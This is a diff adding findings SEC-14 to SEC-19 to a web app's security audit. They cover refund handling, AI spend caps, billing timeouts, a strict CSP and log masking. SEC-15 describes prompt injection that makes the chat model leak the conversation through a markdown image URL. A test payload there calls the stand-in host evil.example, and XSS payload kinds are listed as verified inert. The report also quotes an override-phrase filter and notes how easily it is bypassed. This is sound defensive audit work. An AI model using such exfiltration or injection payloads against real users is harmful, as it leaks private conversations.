@@ -18,6 +18,12 @@ Scope, method and threat model: see `THREAT_MODEL.md` (Part 2). Local test stack
 | SEC-11 | Low | BFF / CSRF | `/api/chat` (spends credits) lacked the Origin / Sec-Fetch-Site guard of the other state-changing routes | **Fixed** (branch `security/audit-fixes-a`) |
 | SEC-12 | Low | Database / privileges | The service runs as the schema owner; the ledger writer resolved names through the caller's `search_path` and any role could execute it; no least-privilege role existed | **Fixed** (branch `security/audit-fixes-a`) — migration 012; app-role split ready, switching is an owner decision |
 | SEC-13 | Low | Webhook / payments | A signed `order_created` was credited without checking test mode, store or a present currency | **Fixed** (branch `security/audit-fixes-a`) |
+| SEC-14 | Low | Webhook / payments | Lemon refunds were invisible: credits of a refunded order stayed and nothing recorded or reported it | **Fixed** (branch `security/audit-fixes-b`) — recorded and reported for manual review (no automatic claw-back, owner decision) |
+| SEC-15 | Low | AI Lab / output | Model output could make the browser load any remote image (markdown image) — conversation exfiltration / tracking via prompt injection | **Fixed** (branch `security/audit-fixes-b`) |
+| SEC-16 | Medium | AI Lab / cost | No ceiling on model spend: no daily caps (per user or global), unbounded output tokens, up to ~192 000 characters of prompt per turn | **Fixed** (branch `security/audit-fixes-b`) |
+| SEC-17 | Low | BFF / availability, billing | BFF → billing calls had no timeout: a hung billing service held AI turns for minutes and late captures left answers uncharged | **Fixed** (branch `security/audit-fixes-b`) |
+| SEC-18 | Low | Frontend / headers | The CSP allowed any inline script (`'unsafe-inline'`), images from any https host and stale CDN origins; no `frame-ancestors`, `form-action`, HSTS; `X-Powered-By` sent | **Fixed** (branch `security/audit-fixes-b`) — strict nonce CSP (owner decision) |
+| SEC-19 | Low | Logging / privacy | Purchase webhooks and receipts logged buyers' full email addresses on every order | **Fixed** (branch `security/audit-fixes-b`) |
 
 ---
 
@@ -346,9 +352,7 @@ Scope, method and threat model: see `THREAT_MODEL.md` (Part 2). Local test stack
   and only `order_created` is acted on. Amount — must equal the pack's list price in `total`, `subtotal` or the
   line price; a buyer who sets `custom_data.package_id` to a dearer pack fails the amount check. `subtotal` is
   before discounts, so an owner-issued discount code (even 100 %) still credits the full pack: intended, noted.
-* **Open (owner decision, Info):** refunds and chargebacks are not handled — `order_refunded` is not subscribed,
-  so credits stay after Lemon refunds an order. Needs a product decision (claw back unspent credits, allow a
-  negative balance, or flag for review).
+* **Open → decided (Part 2B):** refunds are recorded and reported for manual review, never clawed back — SEC-14.
 
 ## Part 2A — areas reviewed without a further finding
 
@@ -380,3 +384,233 @@ Evidence is the named test, or the code reference where a test would only restat
   must exceed the BFF's `GEMINI_TIMEOUT_MS` (default 30 s) plus `BILLING_RETRY_DELAYS_MS` (default ≈ 4.25 s).
   Otherwise a slow but successful turn finds its hold expired, capture answers `HOLD_EXPIRED`, and the answer is
   delivered uncharged. The services cannot check this pair at boot because each knows only its own half.
+
+---
+
+# Part 2B (branch `security/audit-fixes-b`)
+
+## SEC-14 — Low — Refunded Lemon orders kept their credits silently
+
+* **Where:** `services/auth-billing-service/src/services/webhook.service.ts`; database (new migration 013).
+* **Weakness:** only `order_created` was handled. After Lemon refunded an order (full or partial — e.g. a buyer
+  asking for a refund after spending the credits) nothing recorded it and nothing reported it, so the owner could
+  not notice a buy → spend → refund pattern.
+* **Repro:** `tests/api/webhook.refunds.test.ts` — a signed `order_refunded` for a credited order was answered 200
+  and dropped (`ignored_event_type`): nothing stored, nothing listed.
+* **Lemon facts used (official docs, not guessed):** `order_refunded` "A full or partial refund is issued on an
+  order", payload = the Order object (`status` `refunded` / `partial_refund`, `refunded` = fully refunded,
+  `refunded_amount` / `refunded_amount_usd` in cents, `refunded_at`, `test_mode`, `store_id`). No dispute or
+  chargeback event exists in Lemon's event list; their refunds/chargebacks page says Lemon handles chargebacks and
+  "in most cases" refunds on the store's behalf, but does not say whether that emits `order_refunded`. The webhook
+  meta has no event id.
+* **Fix (owner decision: no automatic claw-back):** the webhook verifies the signature exactly as for
+  `order_created`, applies the same origin gate (store id; test mode in production, SEC-13), validates status and
+  amount, and inserts one row per refund state into `lemon_order_refunds` (unique on order id + status + refunded
+  amount: retries and replays are no-ops, a later larger partial refund is a new row). It never touches the ledger
+  or balances. `refunded_orders_to_review()` (read-only, pinned `search_path`) lists unreviewed refunded orders
+  whose `CREDIT_PURCHASE` is in the ledger; `npm run db:reconcile` prints them as `refunded_order_credited` and
+  exits 2 until the owner sets `reviewed_at` (runbook §9). The app role may insert and read refunds, not mark
+  them reviewed or delete them. Logs carry order id, status, amount — not the buyer's email.
+* **Tests:** `tests/api/webhook.refunds.test.ts` (13), `tests/db/cli.test.ts` (reconcile lists / clears),
+  `tests/api/app-role.test.ts` (flow as the app role; review/delete refused), runbook rollback covers 013.
+* **Behaviour change (Lemon / ops):** subscribe `order_refunded` in the Lemon dashboard (runbook §8);
+  `db:reconcile` can now exit 2 for unreviewed refunds.
+* **Open:** chargebacks without an `order_refunded` (undocumented) — check the Lemon dashboard's disputes in the
+  weekly review.
+
+## SEC-15 — Low — Remote images in AI output were loaded automatically
+
+* **Where:** `src/components/ai/ChatMessageContent.tsx` (assistant messages).
+* **Weakness:** the renderer (react-markdown → remark-math → rehype-katex → rehype-sanitize) allowed `img` with
+  `https:` sources, so a model answer containing `![x](https://host/p.gif?q=…)` made every viewer's browser
+  request that URL. Model output is attacker-influenced whenever the user pastes crafted text ("paste this prompt
+  into the AI Lab"): the injected instruction can make the model put the conversation into the URL — the classic
+  markdown-image exfiltration channel — and it reveals the viewer's IP to the host. Low: the only data in reach is
+  the user's own conversation, and the user has to paste the injection themselves.
+* **Repro:** `tests/unit/ai/chat-output-rendering.test.tsx` — "markdown image to a third party": an `<img
+  src="https://evil.example/p.gif?leak=chat">` was rendered.
+* **Fix:** images in assistant output render as a link `[image: alt]` (http/https only, `target=_blank`,
+  `rel="noopener noreferrer"`); nothing is fetched unless the user clicks. The CSP (frontend part of 2B) adds
+  `img-src` as a second layer.
+* **Verified inert (same test, 19 payloads):** raw `<script>`, `<img onerror>`, `<svg onload>`, `<iframe>`,
+  `<style>`, `<form>`, `javascript:` / `vbscript:` / `data:` links (inline, reference, autolink, entity-obfuscated),
+  `javascript:` images, KaTeX `\href` / `\url` / `\htmlStyle` / `\htmlClass`, HTML inside code fences. Raw HTML
+  is never parsed (no `rehype-raw`); sanitize runs last, so even KaTeX's output is sanitized. User messages are
+  plain text.
+* **Info (owner decision, not changed):** because sanitize runs after KaTeX with the default schema, KaTeX's
+  classes and MathML are stripped and maths in answers renders as garbled plain text. Making it render needs either
+  sanitize-before-KaTeX (KaTeX's own output then becomes trusted; `trust` stays off) or a schema that allows
+  KaTeX's classes, inline `style` and MathML. Both widen what model output can produce — a deliberate choice.
+
+## SEC-16 — Medium — AI Lab spend had no ceiling
+
+* **Where:** `src/app/api/chat/route.ts` (BFF), `services/auth-billing-service/src/services/aiCredits.service.ts`.
+* **Weakness:** a turn costs one credit, but nothing bounded what a turn or a day costs us. Every verified account
+  gets free credits (sign-up bonus), sign-ups are limited only per IP; a turn could send 24 × 8 000 characters of
+  client-chosen history (~48 k tokens) and receive an answer of the model's maximum length (`maxOutputTokens`
+  unset); there was no per-user or service-wide daily cap — the only limits were 10 turns/min/user (Upstash when
+  configured, plus an in-memory per-instance limit). A farm of free accounts, or one compromised paying account,
+  turns directly into model spend with no circuit breaker.
+* **Repro:** `services/auth-billing-service/tests/api/ai-daily-caps.test.ts` (no cap: the 4th / 9th turn of a user
+  was reserved, the global budget never refused) and `tests/api/chat.limits.test.ts` (`maxOutputTokens`
+  absent from the model call; a 24 × 7 900-character history forwarded whole).
+* **Fix:**
+  * Express, at reservation time under the user's advisory lock: `AI_DAILY_TURNS_PER_USER` (default 200 per rolling
+    24 h) → `429 AI_DAILY_LIMIT` with `limit` and `retryAfter` (when the oldest turn leaves the window);
+    `AI_DAILY_TURNS_GLOBAL` (default 3 000) → `503 AI_CAPACITY_REACHED`, logged as an error. Every reservation counts
+    (released/expired turns still called the model). Database-backed, so the caps hold across instances; the
+    per-user count is serialised (concurrent turns cannot overshoot, tested with 8 parallel requests), the global one
+    is a soft breaker (may overshoot by the in-flight count). Invalid or non-positive values fall back to the
+    defaults — a typo cannot switch a cap off. Migration `014` adds the two indexes for the counts.
+  * BFF: `maxOutputTokens` = `GEMINI_MAX_OUTPUT_TOKENS` (default 2 048); the conversation sent to the model is the
+    newest turns that fit 32 000 characters (the user's question always included); `AI_DAILY_LIMIT` → `429` with
+    `Retry-After`, `AI_CAPACITY_REACHED` → `503`; in both cases nothing is reserved and the model is not called.
+* **Behaviour change (frontend / env):** new answers `429 {error:"AI_DAILY_LIMIT", retryAfter}` and
+  `503 {error:"AI_CAPACITY_REACHED"}` from `/api/chat` (the UI shows them like other error codes); long
+  conversations lose their oldest turns from the model's context; answers longer than ~2 048 tokens are cut by the
+  model. New optional env: `AI_DAILY_TURNS_PER_USER`, `AI_DAILY_TURNS_GLOBAL` (Express), `GEMINI_MAX_OUTPUT_TOKENS`
+  (Next). Pick the global cap from your budget: worst case ≈ cap × (32 k chars in + 2 048 tokens out) per day.
+
+## SEC-17 — Low — BFF → billing calls without a timeout
+
+* **Where:** `src/lib/billing/server-billing.ts` (`callInternal`: reserve, capture, release).
+* **Weakness:** the internal `fetch` had no deadline. A billing service (or a proxy in front of it) that accepts
+  the connection but does not answer — a stuck database lock, an overloaded instance — held each AI request for
+  undici's default (~300 s) per attempt, up to four attempts for a capture: browsers hang, BFF connections pile up,
+  and a capture that lands after the hold's TTL (600 s) is refused, so a delivered answer goes uncharged.
+* **Repro:** `tests/api/chat.billing-timeout.test.ts` — with a billing stand-in that never answers `/consume`,
+  the chat request was still pending after 20 s; a capture that hung once was never retried.
+* **Fix:** every internal call (and its body read) is bounded by `BILLING_CALL_TIMEOUT_MS` (default 10 s); a
+  timeout is handled like an unreachable service: a reservation → `503 BILLING_UNAVAILABLE` without calling the
+  model; a capture / release → retried (both idempotent — a capture that did land is answered `alreadyProcessed`),
+  tested to charge exactly once. `npm run check:config` now counts the capture attempts' timeouts in the longest
+  turn (defaults: 30 s + 4.25 s + 4 × 10 s = 74.25 s, TTL must be ≥ 2× that).
+* **Behaviour change (env):** optional `BILLING_CALL_TIMEOUT_MS` (Next).
+
+## SEC-18 — Low — Content-Security-Policy did not restrict script execution
+
+* **Where:** `next.config.ts` (static headers), `src/middleware.ts` (now `src/proxy.ts`), `src/app/layout.tsx`.
+* **Weakness:** the CSP had `script-src 'self' 'unsafe-inline' https://accounts.google.com`: any injected inline
+  script or event handler would run, so it gave no XSS protection. `img-src https:` allowed every host (the SEC-15
+  channel), `connect-src` still listed the drei HDRI CDNs removed by FINDING-31, and `frame-ancestors`,
+  `form-action`, `upgrade-insecure-requests` and HSTS were absent (only `X-Frame-Options`). Next sent
+  `X-Powered-By: Next.js`. Low: no XSS sink was found (React escaping, the sanitised markdown renderer — SEC-15);
+  this is the second layer.
+* **Repro:** `tests/e2e/security-headers.spec.mts` and `tests/api/csp.test.ts` against the old headers: script-src
+  contained `'unsafe-inline'`, `frame-ancestors` missing, `img-src` contained `https:`.
+* **Fix (owner decision: strict nonce CSP, pages rendered per request):** `src/proxy.ts` (Next 16's rename of
+  `middleware.ts`; the page gating is unchanged) sets a fresh 128-bit nonce per page request and
+  `script-src 'self' 'nonce-…' 'strict-dynamic'` (`'unsafe-eval'` only under `next dev`), `frame-ancestors 'none'`,
+  `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, `default-src 'self'`, purpose-listed third parties
+  (Google Identity Services per Google's documented values — `gsi/style`, `gsi/` frames and endpoints; PubChem and
+  Wikipedia for the structure/element data; `upload.wikimedia.org` images), `worker-src 'self' blob:` and
+  `upgrade-insecure-requests` in production behind https. Next applies the nonce to its own scripts; the root layout
+  puts it on the theme script, which also makes every page dynamic (a nonce CSP requires it). API routes get a static
+  `default-src 'self'; frame-ancestors 'none'; form-action 'none'` policy. `next.config.ts`: HSTS
+  (`max-age=63072000; includeSubDomains`, production only, no `preload`), `Cross-Origin-Opener-Policy:
+  same-origin-allow-popups` (Google's guidance for sign-in popups), Permissions-Policy adds `payment=()`, `usb=()`,
+  `poweredByHeader: false`.
+* **Verified in the browser (dev and production builds):** every served `<script>` carries the response's nonce,
+  nonces differ per request; injected markup cannot run script (inline `<script>` in an injected `srcdoc`
+  iframe, `onerror` handler, `javascript:` link — all blocked with a `script-src` violation); all public pages
+  including the three 3D scenes, and the signed-in dashboard / AI Lab / profile, render with **zero** CSP
+  violations and no page errors; the whole E2E suite passes under the policy (48/48 production, 46+1 skipped dev).
+* **Trust model, stated:** `'strict-dynamic'` trusts scripts that already-trusted code creates (that is how the
+  Google Identity script loads); styles keep `'unsafe-inline'` (React / framer-motion / R3F set style attributes;
+  CSS injection is not script execution).
+* **Follow-up from the ZAP baseline (reproduced, fixed in the same finding):** the first matcher skipped every path
+  containing a dot, so the HTML 404 page for e.g. `/robots.txt` or `/anything.php` was served without a CSP. The proxy
+  now covers every HTML response and skips only API routes, build assets and `hdri/` (tests: matcher unit test and
+  "404 pages … carry the CSP too" in the E2E spec).
+* **Not verifiable offline:** the live Google sign-in (Google's hosts are blocked in E2E). The policy follows
+  Google's documented values; confirm a real Google sign-in on staging. Escape hatch: `CSP_MODE=report-only` (Next
+  then sends `Content-Security-Policy-Report-Only`; nonces keep working).
+* **Behaviour change (hosting / env):** all pages are server-rendered per request (no static/CDN caching of HTML;
+  `_next/static` assets are unchanged). New optional env `CSP_MODE` (Next). Browsers remember HSTS for two years
+  once the site is served over https.
+
+## SEC-19 — Low — Full email addresses in production logs
+
+* **Where:** `services/auth-billing-service/src/services/webhook.service.ts`, `src/lib/email.ts`.
+* **Weakness:** "Processing user" (every purchase), "Purchase receipt sent", "No user matches the order email" and
+  "Missing user identity" logged the buyer's full address; the Resend error path logged Resend's raw response body.
+  Logs are retained and shipped to third parties far more widely than the database — personal data there is harder
+  to delete and to protect.
+* **Repro:** `services/auth-billing-service/tests/api/log-hygiene.test.ts` — a purchase matched by email and an
+  unmatched order email: the full address appeared in the captured production log lines.
+* **Fix:** `maskEmail()` (`a***@example.com`: enough to correlate a support request) at all four sites; the Resend
+  error body is cut to 200 characters with addresses replaced.
+* **Reviewed, no change:** no log line carries a password, session token, internal key, reset/verification token or
+  link in production — the dev-only mail stand-in that prints whole mails is refused in production (SEC-08);
+  rate-limit, auth and chat logs carry user ids, not addresses. `.env.example` files contain placeholders only
+  (the two `replace-with-…` secrets are on both services' placeholder deny-lists; the local Docker password is the
+  dev compose value). Error bodies: Express answers generic messages without stacks (FINDING-12, SEC-08), the BFF's
+  error bodies are tested free of stack traces and paths (SEC-08 E2E).
+
+## Dynamic scan — OWASP ZAP baseline (Part 2B)
+
+* **Tool:** official image `ghcr.io/zaproxy/zaproxy:stable` (ZAP's docs: "Docker" → about / baseline-scan), pulled
+  once and pinned by digest `sha256:5ccfff9a411743ab2615136a2edd7416bec9ce41572fa94e935df38c14adb2b6` (ZAP 2.17.0).
+  One-off `docker run --rm`, only mount: the repo's gitignored `test-results/zap/`. Image removed afterwards
+  (`docker rmi`); no other container or Docker setting touched.
+* **Target:** only the local production-mode E2E stack (`next build` + `next start` on port 3100, Express on
+  127.0.0.1:4100 behind it, Lemon/Gemini stubbed in-process), reached from the container as
+  `http://host.docker.internal:3100` (Docker Desktop's name for this machine). Traditional spider only (2 min); the
+  Ajax spider was not used because its browser would execute page JavaScript and contact Google/PubChem/Wikipedia
+  from the container. `zap-baseline.py` is passive — no attack payloads.
+* **Result:** 50 URLs, **0 FAIL**, 62 → 63 PASS, warnings below. Every warning was reproduced or explained before
+  deciding:
+
+| ZAP rule | Instances | Outcome |
+| --- | --- | --- |
+| 10038 CSP header not set | `/robots.txt`, `/sitemap.xml` | **Reproduced → fixed** (SEC-18 follow-up); gone on the re-scan |
+| 10031 User-controllable HTML attribute | `/explore?molecule=…` | Not exploitable: probed with `x"><script>…<img onerror>`; the value only appears JSON-escaped (`\u003cscript\u003e`) inside Next's RSC payload, never as markup |
+| 10055 CSP `style-src 'unsafe-inline'` | every page | Accepted, documented in SEC-18 (inline style attributes from React/framer-motion/R3F; not script execution) |
+| 90004 COEP / COOP / CORP | pages, static chunks | Accepted: `require-corp` would break Wikipedia images and Google sign-in; COOP is deliberately `same-origin-allow-popups` (Google's guidance for sign-in popups), which ZAP reports as "invalid" |
+| 10019 Content-Type missing | `/ai-lab`, `/dashboard`, `/profile` | Expected: the 307 redirects to `/login` for an anonymous client carry no body |
+| 10049 Non-storable content | pages | Expected: pages are rendered per request (nonce CSP) |
+
+* Raw reports (HTML / JSON / Markdown) stay local in `test-results/zap/` (gitignored), not committed.
+
+## Part 2B — areas reviewed without a further finding
+
+* **AI Lab — Gemini key:** read only in `src/app/api/chat/route.ts` (server); no `NEXT_PUBLIC_` variable carries a
+  secret (the only ones are the Google client id and the Lemon variant ids, public by nature). The E2E test "client
+  bundles carry no server secret" fetches every client chunk of every public page and finds none of `JWT_SECRET`,
+  `INTERNAL_SERVICE_SECRET`, `GEMINI_API_KEY`; production serves no source maps (`.map` → 404).
+* **AI Lab — 402 / 409 paths:** a reservation happens before the model is called, so neither path yields a free
+  generation; the reference is server-generated (`randomUUID`), so a client cannot provoke or replay a 409; a 402
+  reveals only the price of the operation. Both are behind the per-user rate limit and, now, the daily caps.
+* **AI Lab — concurrency:** reservations serialise on the per-user advisory lock (FINDING-22 suites); the per-user
+  daily cap is checked under the same lock (8 parallel requests → exactly the cap reserved, SEC-16 test).
+* **AI Lab — content-policy heuristic (`validateAiOutput`):** four regexes over the *output* (e.g. "ignore previous
+  instructions", "system prompt"). Trivially bypassed (paraphrase, spacing, another language), and it can misfire
+  on an innocent answer that mentions a "system prompt"; a blocked answer is charged (422, deliberate since
+  FINDING-03 so probing is not free). Bypassing it gains nothing beyond what the user could already obtain: there
+  are no tools, no other users' data and no secrets in the prompt (the system prompt is not confidential), and the
+  output is rendered inert (SEC-15) under the CSP. Treat it as a weak quality filter, not a security control; a
+  moderation API / Gemini safety settings are the upgrade path (already a TODO in the code).
+* **AI Lab — prompt injection:** the client sends the whole history, including "assistant" turns, so a user can
+  forge context — only for their own session. Output side-effects are limited to rendering (inert) and the SMILES
+  tag, which fetches `pubchem.ncbi.nlm.nih.gov/rest/pug/compound/smiles/<encoded>/SDF` (fixed host, path-encoded
+  value; Info: the molecule string is sent to PubChem, a third party).
+* **Frontend — XSS sinks:** `dangerouslySetInnerHTML` only for the theme pre-hydration script (constant input,
+  tested to be a self-contained expression, now nonced); `innerHTML = ""` only to clear the Google button container;
+  markdown only through `ChatMessageContent` (SEC-15 matrix); links in AI output are http(s) only with
+  `rel="noopener noreferrer"`.
+* **Frontend — browser storage:** no token anywhere (TC-27). `localStorage` keeps the theme, locale, onboarding
+  flags and the signed-in profile (id, email, names, date of birth, flags) for instant UI; it is refreshed from the
+  server on every load and cleared on logout and on a 401. Info: on a shared device the profile stays readable until
+  the app next runs; dropping `dateOfBirth` from the cached copy is possible but risks the profile form initialising
+  empty — not changed. `sessionStorage` holds only checkout intent / scroll position.
+* **Third-party scripts:** only Google Identity Services, loaded on demand by `GoogleSignInButton` from
+  `accounts.google.com/gsi/client` (Google publishes no SRI hash for it; it is trusted through `'strict-dynamic'`
+  because our nonced code inserts it). No analytics, no CDN script.
+* **Startup validation recap:** both services' production checks (SEC-08) plus `npm run check:config` for the pair
+  (placeholders, values that must match, hold TTL vs the longest turn). Not checked at boot by design: `GEMINI_API_KEY`
+  (the site still works without the AI Lab; `check:config` reports it).
+* **Dev-only behaviour cannot reach production:** dev mail logging (refused under production rules, SEC-08), dev CORS
+  (production gate, fail-closed), DB error details in responses and `/health` (only for exactly
+  `NODE_ENV=development`), CSP `'unsafe-eval'` (only under `next dev`), `MOLECULESTUDIO_SKIP_DOTENV` (refused with
+  `NODE_ENV=production`), Lemon test mode (SEC-13 gate).
+
